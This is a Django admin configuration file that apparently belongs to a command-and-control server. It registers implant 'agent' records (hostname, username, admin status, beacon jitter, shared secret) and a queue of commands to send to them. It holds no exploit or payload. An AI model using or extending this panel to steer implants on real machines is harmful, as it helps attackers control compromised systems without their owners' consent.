from django.contrib import admin
from .c2_app.models import MorphinAgent, CommandQueue

class CommandInline(admin.TabularInline):
    model = CommandQueue
    extra = 1

@admin.register(MorphinAgent)
class AgentAdmin(admin.ModelAdmin):
    list_display = ('agent_id', 'hostname', 'username', 'last_seen', 'jitter_base', 'is_admin')
    inlines = [CommandInline]
    readonly_fields = ('shared_secret',)

@admin.register(CommandQueue)
class CommandAdmin(admin.ModelAdmin):
    list_display = ('agent', 'command_text', 'command_value', 'is_sent', 'created_at')